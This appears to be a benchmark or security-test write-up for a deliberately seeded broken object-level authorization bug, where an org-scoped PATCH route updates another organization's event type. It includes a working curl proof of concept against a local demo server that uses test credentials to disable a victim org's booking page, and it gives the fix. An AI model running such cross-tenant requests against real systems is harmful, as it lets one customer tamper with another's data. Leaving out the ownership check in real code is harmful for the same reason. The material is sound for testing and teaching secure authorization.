# `bola/composite-key-mismatch` — scoped path with unverified resource scope

## The bug

`PATCH /api/v1/orgs/{org_id}/event-types/{event_type_id}` checks that the caller is an
admin of `org_id`. But it then loads the event_type by `id` alone and updates it —
**without verifying** `event_type.org_id == org_id`. An admin of Org A can mutate any
event_type, including event_types belonging to Org B, by passing
`/orgs/{A}/event-types/{B-event-type-id}`.

## Why static analysis misses it

Every authorization helper is called and behaves correctly in isolation. The bug is the
unenforced consistency between two unrelated path parameters — pure semantic intent.
SAST has no model of "scoped routes must verify the resource belongs to the scope."
AI SAST also tends to miss this: the role check is present, the resource lookup is
present, and there's no anomalous-looking code.

## PoC

```bash
# Alice (admin/owner of Acme) targets Initech's support-call event type.
ALICE_TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@acme.test","password":"demo1234"}' \
  | python -c "import sys, json; print(json.load(sys.stdin)['access_token'])")

# Find Acme org id (Alice is owner of Acme)
ACME_ID=$(curl -s http://127.0.0.1:8000/api/v1/orgs \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  | python -c "import sys, json; print(next(o['id'] for o in json.load(sys.stdin) if o['slug']=='acme'))")

# Find Initech's support-call event type id (owner_id = Carol = 4)
INITECH_ET=$(curl -s http://127.0.0.1:8000/api/v1/users/4/event-types \
  | python -c "import sys, json; print(next(e['id'] for e in json.load(sys.stdin) if e['slug']=='support-call'))")

# Disable Initech's bookable event type by routing through Acme's scope
curl -s -X PATCH "http://127.0.0.1:8000/api/v1/orgs/$ACME_ID/event-types/$INITECH_ET" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"is_active":false}'
```

Expected (vulnerable): `200` with `is_active:false` on Initech's `support-call`.
Initech's bookable page goes dark; their public users can no longer book.

On `main`: `404` (`Event type not found in this org`).

## Fix

Restore the `et.org_id != org_id` cross-check. Better: load the event_type via a query
that already binds the org, e.g. `db.query(EventType).filter_by(id=event_type_id, org_id=org_id).first()`.
